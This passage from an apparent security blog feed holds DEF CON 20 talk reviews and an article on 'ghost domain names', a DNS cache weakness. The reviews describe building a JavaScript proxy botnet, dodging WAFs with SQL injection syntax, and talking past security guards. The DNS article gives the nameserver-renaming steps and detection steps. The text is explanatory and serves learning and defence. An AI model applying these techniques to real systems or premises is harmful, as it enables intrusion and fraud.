&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1217.JPG&quot; alt=&quot;IMG 1217&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;owning-bad-guys-with-javascript-botnets&quot;&gt;Owning bad guys with Javascript Botnets&lt;/h2&gt;

&lt;p&gt;This was also a very good and informative talk by Chema Alonso. The speaker starts by telling how people think that creating a botnet is considered a very tedious task. He then talks about a new idea for creating botnet that he has been working on. He talks about the idea of a JS in the middle attack. This would allow the attacker to modify form fields, get access to cookie etc. But how will it be possible to inject JS code in the middle. He then talks about using a proxy server which will allow the users to direct their traffic through it. He then tells about how the information about the proxy server is posted by other people on the internet. Once the IP address of the proxy server is spread over the internet, people will connect to it without thinking much. Once the people connect through, all the javascript files are infected with the malicious Javascript code. The speaker then tells that how in just one day he was able to get control of 5000 bots. The speaker then finally concludes by giving examples of the information that he found in some of the bots and gives a quick look into the control panel of this botnet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1221.JPG&quot; alt=&quot;IMG 1221&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A pic from the panel discussion “Meet the Fed Panel Two”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1225.JPG&quot; alt=&quot;IMG 1225&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A pic from “Q &amp;amp; A with the Men (and Women) in Black”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1226.JPG&quot; alt=&quot;IMG 1226&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A pic from “Bigger Monster,Weaker Chains: The NSA and the Constitution”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1227.JPG&quot; alt=&quot;IMG 1227&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you are at Defcon, you may not want to miss on the Defcon nightlife. There are a lot of parties held everyday, some of them are private and need invitations, while some of them are open to all the Defcon attendees. I went to the Infected mushroom party on Saturday night. Here is a pic from the party.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon3/IMG_1245.JPG&quot; alt=&quot;IMG 1245&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here is a video from the Infected Mushroom party.&lt;/p&gt;

&lt;h3 id=&quot;embed-code-for-video-goes-here&quot;&gt;EMBED CODE FOR VIDEO GOES HERE&lt;/h3&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Defcon 20 Day 2 Review</title>
   <link href="https://bitbrain.github.io/2013/06/15/defcon-20-day-2-review.html"/>
   <updated>2013-06-15T02:51:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/defcon-20-day-2-review</id>
   <content type="html">&lt;p&gt;The talks on Defcon day 2 were scheduled to begin from 10 am. I reached the venue at 8:30 am and decided to use the time to buy some Defcon merchandise. The lines for the merchandise are usually very long but it wasn’t at that time of the day.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/1.JPG&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After buying a Defcon T-shirt, i decided to go to the room where the CTF contest was being held. The room was already filled with participants who were just setting up their systems for the contest.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/2.JPG&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are some pics of the contests hall where some of the events like Bro CTF, gaming events etc were being held.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1092.JPG&quot; alt=&quot;IMG 1092&quot; /&gt; &lt;img src=&quot;/images/posts/defcon2/IMG_1094.JPG&quot; alt=&quot;IMG 1094&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there was also the very famous Wall of Sheep.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/Wall_OF_sheep.JPG&quot; alt=&quot;Wall OF Sheep&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Making Sense of Static - New tools for hacking GPS&lt;/p&gt;

&lt;p&gt;This talk was mainly focussed on explaining how the GPS works and introduced some of the new tools for GPS hacking. The talk was mainly divided into three parts a) Why is GPS interesting for hacking. b) GPS 101 and c) New tools for hacking GPS. The speakers started by explaining that these days there are a lot of GPS devices being used and hence a lot of techniques have been developed for performing spoofing and jamming attacks. They then gave a very detailed description about GPS, how the geolocation information is being determined by locating the distance from the satellites and all the other technical aspects related to it.In the end, the speakers introduced two new GPS hacking tools named Libswiftnav and Piksi.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/pIksi.png&quot; alt=&quot;PIksi&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Drones&lt;/p&gt;

&lt;p&gt;The speaker Chris Anderson starts by telling how the vast amount of technology required to create Drones is already available to the public for a very cheap amount. He then tells about how he once started a community DIY drones dedicated to created drones. Over the past 5 years, it has transformed into the largest amateur UAV community on the web. He then explains that the success of this was because of the support from the community and the use of Open source hardware and software. DIY Drones has been able to create thousands of Unmanned aerial vehicles at a cost of as less as 1% than the cost of the equivalent military drones. He then explains about the challenges that he faced while creating the community. He tells about his plan to make these drones available to the public at a good price and the legal challenges that he is going to face while doing this. He also explains how by doing this the community can actually help them improve their product. He explains about his plan to compete with some of the aerospace industries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1115.JPG&quot; alt=&quot;IMG 1115&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Can You Track Me Now? Government And Corporate Surveillance Of Mobile Geo-Location Data&lt;/p&gt;

&lt;p&gt;This was a panel discussion by Christopher Soghoian, Ben Wizner, Catherine Crump and Ashkan Soltani. The speakers tell about the investigation they have done on how the government is utilizing geolocation data of regular users via their mobile devices. The speakers first start by explaining about some of the local and network attacks which could lead to disclosure of geolocation information. These could be local caches stored on their phone or through third party apps which disclose the user’s geolocation information. In some cases, the photos in the device and are available to the third party apps and these photos could sometimes contain geolocation information. They explain about how the carriers companies are forced by the government to reveal the location data of their customers. This geolocation information could be of different types for e.g real time GPS data, historical data or triangulated data. They explain how the carrier companies have built web portals which allow government to track the users while sitting at their office. They also explain that encrypting information on a mobile device doesn’t server the purpose as Apple and Google (which are the two major manufacturers of mobile OS) can undo the encryption if needed by the government. A lot of innocent citizens are subjected to surveillance and they don’t even know about it. They also explain how the laws for protecting user’s privacy are outdated and are not up to pace with the technology. The speakers finally conclude by saying that the least these carries companies can do is inform the users if their private information is being looked into.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1086.JPG&quot; alt=&quot;IMG 1086&quot; /&gt;&lt;/p&gt;

&lt;p&gt;New techniques in SQLi obfuscation&lt;/p&gt;

&lt;p&gt;The speaker Nick Galbreath discusses about some of new techniques of hiding SQL injection from WAF’s. He first starts by introducing Libinjection which is a quasi-SQL tokenizer and parser to detect SQL injection. He then explains how he tested it with a very large number of Sql injection attacks and noted that some of the code in WAF’s was never even executed. He explains how he walked through some of the dark corners of different languages like MySql, PGSql, Oracle looing for different kinds of syntax. He starts by explaining about the NULL character. NULL in MySQL an be written as \N, whereas \n means a new line. This means any WAF that does a to_lower on the user input and looks for null will miss this test case. He then explains about some of the unique Postgres functions that might slip through WAF’s too. He explains that because of so much of syntax available and because of the ability to write things in different formats, it becomes tough to write a regular expression to detect SQL injection. He continues the discussion by talking about some oracle special literals, hexadecimal literals . binary literals, money Literals. comments, strings etc and how their syntax can be used to get through WAF. He finally concludes the talk by talking about his intention to add more parsing support for libinjection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1122.JPG&quot; alt=&quot;IMG 1122&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Divashark&lt;/p&gt;

&lt;p&gt;The speaker talks about a new tool named Divashark he has been working on. He starts by telling that the inspiration behind this work came from the Defcon Capture the Packet contest where contestants use Wireshark filters to get the information they need. Divashark is an application which assists in live network traffic analysis. He explains how Wireshark can sometimes contain too much information, and if someone is looking for high level information like username and password, then it becomes a very tedious task. He tells that Divashark has the capability to follow tcp and udp streams and group them together. It also has some Protocol dissectors which are designed to get you the information that you want. He finally concludes by telling that the user interface isn’t ready yet but should be available soon.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1125.JPG&quot; alt=&quot;IMG 1125&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are some other pictures from Defcon day 2&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon2/IMG_1104.JPG&quot; alt=&quot;IMG 1104&quot; /&gt; &lt;img src=&quot;/images/posts/defcon2/IMG_1110.JPG&quot; alt=&quot;IMG 1110&quot; /&gt; &lt;img src=&quot;/images/posts/defcon2/IMG_1097.JPG&quot; alt=&quot;IMG 1097&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Defcon 20 Day 1 Review</title>
   <link href="https://bitbrain.github.io/2013/06/15/defcon-20-day-1-review.html"/>
   <updated>2013-06-15T02:45:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/defcon-20-day-1-review</id>
   <content type="html">&lt;p&gt;This article will discuss about the talks and events that happened on Defcon day 1.&lt;/p&gt;

&lt;h2 id=&quot;venue-rio-hotel-and-casino&quot;&gt;Venue: Rio Hotel and Casino&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon1//1.JPG&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We reached Rio Hotel at around 8 am. We thought we did good on time until a nice gentleman came to us and said “It’s a 3 hour long line guys !”. We however got through the line in about 90 minutes, thanks to the nice staff at Defcon.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon1//3.JPG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One you get through the registration process, you are offered a Defcon badge which is your entry pass to Defcon and a booklet that informs you about the whole Defcon schedule.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon1//IMG_0909.JPG&quot; alt=&quot;IMG 0909&quot; /&gt; &lt;img src=&quot;/images/posts/defcon1//IMG_0914.JPG&quot; alt=&quot;IMG 0914&quot; /&gt; &lt;img src=&quot;/images/posts/defcon1//IMG_0915.JPG&quot; alt=&quot;IMG 0915&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;to-digital-forensics-tools-and-tactics&quot;&gt;to Digital Forensics: Tools and Tactics&lt;/h2&gt;

&lt;p&gt;This talk by Ripshy and Jacob was mainly directed at people who wanted to get started with Infosec. Before the talk, the authors quickly distributed some Backtrack Live CD’s to the public. The talk started by an introduction to the Backtrack distro, telling about the little things like the user/pass for logging in to BT and getting started with network services in BT. The author then mentioned the top 5 tools used in Infosec which included Nmap, TCPDump, netcat, Ntop and Metasploit. The author then explained all the 5 top Infosec tools and their basic usage, by giving examples with screenshots, commands etc.&lt;/p&gt;

&lt;h2 id=&quot;cerebral-source-code&quot;&gt;Cerebral Source Code&lt;/h2&gt;

&lt;p&gt;This was one of the best talks i have ever been to at Defcon. This talk by Siviak was mainly focussed on Social Engineering. The speaker starts by explaining how simple things like being nice to people can help you get the information you want. The speaker then tells that things like good books and courses for Social Engineering doesn’t exist. To be good at Social engineering, you have to go out and live the experience, and take a chance whenever possible. The key thing is to motivate people to give you the thing that you want. There is no such thing as an effective Social Engineering technique, it changes by time and even by weather. One of the funny incidents happened when someone from the audience asked “What is an effective technique to get traffic on your site by Social Networking ?” and the speaker replied “PORN.” One of the good questions asked were “What is a good Social Engineering technique to gain access to a security facility via Social Engineering ?”. The speaker Siviak replied by telling that we should always look like we know what we are doing, and that we are supposed to be in the place where we are. If some security guy fires a tough question at you, fire them back ! They don’t know how to react to such a situation. Don’t give their brains time to catch up. Humans are like computers, the more information you give them, the more they will be able to figure things out. We must change things quickly so their brains don’t catch up with what’s going on. If you want to perform Social engineering on a specific subject (person) and you don’t know what he/she has under her desk, how many kids he/she have etc, you are not trying hard enough. These things will help you build a common thread which could help you in obtaining more information from the subject. The talk ended with a last question when someone asked “Do we need to learn psychology in order to perform Social Engineering ?” and the speaker replied “No”. Overall the talk was very informative and the speaker was very funny so he kept the audience in a very good mood throughout.&lt;/p&gt;

&lt;h2 id=&quot;def-con-101&quot;&gt;DEF CON 101&lt;/h2&gt;

&lt;p&gt;This panel was taken by Pyro, Roamer, Lockheed, Alxrogan, Lost and FLipper who are responsible for organizing many of the events and maintaining the network at Defcon. The talk was mainly focussed on how you could maximize your Defcon experience. The main point told by the organizers was “You get as much out of Defcon as you put into it.” They talk about how we should just not attend Defcon talks, but meet and socialize with people. We could just go up to some people, but them a beer and you never know, that guy might just turn into your best friend. The defcon organizers tell about how they are looking forward to this weekend for the whole year, and all they want from us is just to listen to the Goons if they have some problem with you. Lockheed then comes up and talk about some of the challenges they face while setting up the Defcon network. The authors then tell us about the Defcon nightlife, some of the events that will be happening in the night, and asks us to attend these events too. The authors conclude by telling us that we should be careful while talking to the media and should ask for the power to edit the article because you never know what they might publish.&lt;/p&gt;

&lt;h2 id=&quot;screw-the-planet-hack-the-job-&quot;&gt;Screw the Planet, Hack the Job !&lt;/h2&gt;

&lt;p&gt;This talk by Roamer, Lockheed, Alxrogan who are part of the Defcon staff tells us how utilizing Defcon can help you find your dream job. One of the best parts of this talk was when someone asked “I know there are potential employers/employees at Defcon. Do you plan to have something like a job fair at Defcon ?” and one of the speakers replied “I know what you are talking about, we have people who want to hire at Defcon. But the moment we cross that line and it turns into a job fair, we have lost our credibility.”&lt;/p&gt;

&lt;h2 id=&quot;hf-skiddies-suck-dont-be-one-learn-some-basic-python&quot;&gt;HF Skiddies SUCK, don’t be one. Learn some basic Python.’&lt;/h2&gt;

&lt;p&gt;The speaker King TunA starts by speaking about some of the basic advantages of using Python by giving demos via videos (which weren’t possible to see as long as you are very close to the screen but are online on Youtube). The speaker explains how things which can take 200-300 lines of code in other languages could be done in Python in much lesser lines. Finally, the author ends the talk by giving a demo of an HTTP scraper.&lt;/p&gt;

&lt;p&gt;Here’s a quick video of this year’s Defcon badge.&lt;/p&gt;

&lt;h3 id=&quot;video-goes-here&quot;&gt;VIDEO GOES HERE&lt;/h3&gt;

&lt;p&gt;Well there is more to Defcon than just the talks. Its also about the Defco nightlife, meetups etc. There was this very good event called “the Summit” being held which was a fundraiser for the EFF. I went to the hackfest meetup in Flamigo though.&lt;/p&gt;

&lt;p&gt;Well that’s it for Defcon day 1. I will be writing about Defcon day 2 and day 3 also. Please let me know if there is something specific about Defcon that you want me to write about. I leave you now with some pictures from the event.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/defcon1//IMG_0951.JPG&quot; alt=&quot;IMG 0951&quot; /&gt; &lt;img src=&quot;/images/posts/defcon1//IMG_0965.JPG&quot; alt=&quot;IMG 0965&quot; /&gt; &lt;img src=&quot;/images/posts/defcon1//IMG_0970.JPG&quot; alt=&quot;IMG 0970&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>A New DNS Exploitation technique - Ghost domain names</title>
   <link href="https://bitbrain.github.io/2013/06/15/a-new-dns-exploitation-technique-ghost-domain-names.html"/>
   <updated>2013-06-15T02:26:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/a-new-dns-exploitation-technique-ghost-domain-names</id>
   <content type="html">&lt;p&gt;DNS is a naming system which coverts human readable domain names into computer readable IP addresses. Whenever there is a query for a domain which is not in the resolver’s cache, the process happens by traversing through the entire DNS hierarchy from the root servers to the top level domain (for e.g .com). The top level domain then gives us the information about the nameserver that has been delegated the responsibility of the domain whose IP address we are looking for. We then get the information about that domain from it’s nameserver. The results are then cached by the DNS resolver with a particular value of TTL(time to live) after which the entry in the cache expires. In some cases a domain may be identified as malicious and needs to be removed. This could be because of various reasons like malware propogation, phishing etc. One of the steps to prevent users from accessing this domain is by deleting the domain from its TLD (top level domain) servers. However this does not completely remove the threat because the domain will still be resolved by the resolver until the TTL expires. In this article we will discuss about a recent DNS exploit discovered by researchers which is present in most of the DNS servers which exploits a weakness in the cache update logic of some of the DNS servers. This allows their cache to be overwritten in such a way that it is possible to continuously extend the TTL for the delegation data of a particular domain and prevent it from expiring. Hence the domain will be completely resolvable even though it has been deleted from the TLD servers. These types of domains have been named as &lt;em&gt;Ghost Domain Names&lt;/em&gt;.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;This article is based on the recent work by &lt;em&gt;Jian Jiang, Jinjin Liang, Kang Li, Jun Li, Haixin Duan and Jianping Wu&lt;/em&gt;. The research paper by them can be found &lt;a href=&quot;https://www.isc.org/files/imce/ghostdomain_camera.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;dns-basics&quot;&gt;DNS Basics&lt;/h2&gt;

&lt;p&gt;So Lets understand how DNS resolution works. Lets say the user opens up the browser and types in infosecinstitute.com. It is now the responsibility of the DNS resolver in the user operating system to fetch the IP address. It first checks its local cache to see if it can find a record for the queried domain name. A cache usually contains a mapping of IP-addresses to hostnames which are saved during recent lookups so that the resolver does not have to fetch the IP address again and again. If it cannot find the IP address in its cache it queries the DNS server to see if it has a record for it. A DNS server is usually given to you by the ISP or you can manually set up a DNS server for yourself. If it still cannot find the IP Address then it goes through a recursive DNS query in which it queries different nameservers to get the IP-address of the domain. As soon as it finds the IP-address it returns the IP-address back to the user and also caches it for its future use.&lt;/p&gt;

&lt;h2 id=&quot;understanding-dns-lookup&quot;&gt;Understanding DNS lookup&lt;/h2&gt;

&lt;p&gt;It is important to understand how a DNS lookup works. We will do this by traversing the entire DNS hierarchy from the root servers to the top level domain. Open up the terminal in Backtrack (you can use your own favourite distro) and type in “dig”. You will get something as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/dig.png&quot; alt=&quot;Dig&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What we get is a list of the Root DNS Servers. Let’s use this root DNS server to query infosecinstitute.com. We do this as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/dig 1st query.png&quot; alt=&quot;Dig 1st Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What we get is a list of authoritative name servers for the com domain. Notice the dot (.) at the end, this is what makes this a fully qualified domain name (FQDN). Let’s use these Name servers to query again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/dig 2nd query.png&quot; alt=&quot;Dig 2nd Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we get the list of authoritative name servers for infosecinstitute.com (which is ns1.pairnic.com and ns2.pairnic.com). Now we need to query these name servers to get the IP-address of Infosecinstitute.com&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/dig 3rd query.png&quot; alt=&quot;Dig 3rd Query&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now in the Answer Section we can see that the Ip-address for infosecinstitute.com is 216.92.251.5. SUCCESS !&lt;/p&gt;

&lt;p&gt;It is also possible for us to set custom DNS servers to query for different records. In the figure below, we will be using DIG to perform a DNS query for the A record of infosecinstitute.com using Google’s DNS server (8.8.8.8).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The thing 3599 basically indicates the time to live for that particular record provided by the DNS query. If we do the same process again we can see that the TTL has now reduced to 3503.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case a domain is identified as malicious, then its removal from the global domain name space is basically a 2 step process. The first is to remove its records from the TLD servers and the second is to wait for the TTL to expire across all DNS servers.&lt;/p&gt;

&lt;p&gt;To identify the IP address of a domain, one of the important things to know is the delegation data of that particular domain. The delegation data contains the NS record of a domain and its corresponding A record, i.e the IP address of the nameserver. The delegation data also has a particular TTL which tells us the time until which the delegation data will be in the cache. In the figure below, i am querying one of the TLD servers for .com to give me the address of an unexisting subdomain. It replies back with an Authority and an Additional section which has the NS records for the domain as we as the IP address (i.e A record) of the nameservers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see this through an example. Let me create a subdomain named infosec.searching-eye.com on my website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it is done, let’s use a particular open DNS server say 8.8.8.8 (OpenDNS) to query the domain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the response in the answer section. Also we can see that it has a particular TTL value of 14399. The delegation data is now cached by this server. So let’s go ahead and remove the subdomain now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/6.png&quot; alt=&quot;6&quot; /&gt; &lt;img src=&quot;/images/posts/ghost-dns/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the subdomain infosec.searching-eye.com has been successfully removed. Now let’s go ahead and make the same query for the subdomain infosec.searching-eye.com from the same DNS server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Surprise, we still get a response. This is because of the cached records that are present in Google’s DNS server. As we can see the TTL has decreased down to 12790. We know why this response is here. This is because of the fact that the delegation data for the subdomain has been cached into the DNS server because of the query we made while the subdomain was live. Let’s make the same query for the same subdomain through our default DNS server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see from the image above, we get no response. This is because there were no cached records present in our default DNS server due to which it had to traverse the entire DNS hierarchy in order to find the IP address of the subdomain we were looking for. Once it reached the TLD (i.e .com), it found out that there were no records there. Hence it returned no results.&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability&quot;&gt;The Vulnerability&lt;/h2&gt;

&lt;p&gt;The vulnerability exists in the DNS cache update policy of a particular DNS server. As discussed earlier in the article, a domain can be completely removed from the global domain name space by removing it from the TLD and allowing enough time for the delegation data to expire across all DNS servers. If somehow it is possible to extend the TTL of delegation data such that it doesn’t touch 0, then the domain will still be resolvable.&lt;/p&gt;

&lt;p&gt;Note that not all the DNS servers will be vulnerable to this kind of an exploit. However it is discussed in the &lt;a href=&quot;https://www.isc.org/files/imce/ghostdomain_camera.pdf&quot;&gt;paper&lt;/a&gt; that most of the DNS servers were found vulnerable simply because they did not follow a strict cache update logic.&lt;/p&gt;

&lt;p&gt;The first step is to register a nameserver. This service is generally provided by your domain service provider. This is because i want my nameserver to be of the type &lt;em&gt;xyz.mydomain.com&lt;/em&gt; rather than &lt;em&gt;xyz.hostingcompany.com&lt;/em&gt;. Note that the IP address you provide must be a valid IP address of a nameserver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we have registered a nameserver, we have to set it as our nameserver as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can confirm that &lt;em&gt;testns.searching-eye.com&lt;/em&gt; has been successfully set as a nameserver by querying for an non-existent subdomain as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We then create another subdomain named &lt;em&gt;ghost.searching-eye.com&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we take a particular DNS server(which we think is vulnerable) and use it to query the subdomain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-dns/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we know that the delegation data has been cached by the DNS server. So now we go ahead and delete the subdomain. So now the delegation data of the domain will have a TTL which will be constantly decreasing. As we know that the delegation data is the NS record of a domain and the A record of the name server. It could be represented as..&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghost.searching-eye.com 86400 IN NS testns.searching-eye.com testns.searching-eye.com 86400 IN A abc.32.31.xy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After the subdomain has been deleted and some time has passed by, the delegation data could look something like this.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghost.searching-eye.com 46400 IN NS testns.searching-eye.com testns.searching-eye.com 46400 IN A abc.32.31.xy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The next step is to change the name of the nameserver to something else like &lt;em&gt;test2.searching-eye.com&lt;/em&gt;. Using the same DNS server (4.2.2.4) as before, we then query for the A record of the nameserver, i.e &lt;em&gt;test2.searching-eye.com&lt;/em&gt;. The resolver will look into the delegation data and make a query to the IP address of &lt;em&gt;testns.searching-eye.com&lt;/em&gt; which is infact the IP address of &lt;em&gt;test2.searching-eye.com&lt;/em&gt;. It will return the IP address of the nameserver. But it will also notice that their is a new nameserver now (because the name has changed), and it will overwrite the current cache with the new one (cache update logic will vary across different DNS servers ). After the cache is overwritten, the delegation data could look something like this(depending on the fact that the DNS server does not follow a strict cache update logic and is vulnerable to the exploit discussed in this article).&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghost.searching-eye.com 86400 IN NS test2.searching-eye.com test2.searching-eye.com 86400 IN A 192.32.31.xy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can notice that the new delegation data has a new TTL value. If this process is repeated over and over again, it is possible to continuously keep the TTL value from reaching zero. (Though in some cases it will touch 0 after a long period of time, read the &lt;a href=&quot;https://www.isc.org/files/imce/ghostdomain_camera.pdf&quot;&gt;paper&lt;/a&gt; for more details).&lt;/p&gt;

&lt;p&gt;In order to successfully carry out this attack over a large range, the attacker had to make query through as many vulnerable DNS servers as possible before the TTL for the delegation data of the attacker domain expires on those DNS servers. As the number of DNS servers which still cache the delegation data increases, the number of users who still resolve the domain to an IP address controlled by the attacker also increase.&lt;/p&gt;

&lt;h2 id=&quot;detecting-ghost-domain-names&quot;&gt;Detecting Ghost Domain Names&lt;/h2&gt;

&lt;p&gt;Ghost domain names are those domains that have been removed from the TLD but are still resolvable by the DNS server. There could basically be two reasons for it.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The TTL value for the delegation data of the domain has not expired. Note that these kind of domains may not qualify under the category of Ghost domain names simply because their is a possibility that their TTL is not being renewed.&lt;/li&gt;
  &lt;li&gt;The TTL value for the delegation data is being renewed somehow by using the vulnerability in the DNS server.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;These are the steps that could be followed to identify the Ghost domain names.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Perform a DNS lookup on the domain by traversing the DNS hierarchy as discussed in the “DNS lookup” section in this article.&lt;/li&gt;
  &lt;li&gt;Query for an A record of the domain using a particular DNS server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If the DNS lookup step doesn’t give us an IP-address but we get a result from the DNS query step using a particular DNS server, then there is a possibility that the domain is a Ghost domain. We cannot be sure because the results might be coming because the TTL for the delegation data on the DNS server may not have expired (excluding the possibility of resetting the TTL). Hence the challenge is now to identify which are the ghost domains and which are not. The following steps could be followed for that.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Note down the TTL value for the delegation data.&lt;/li&gt;
  &lt;li&gt;Wait for the time equivalent to the TTL value of that domain. Perform the same query again. If the DNS server still resolves the domain then we can be convinced that the domain is a Ghost domain.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

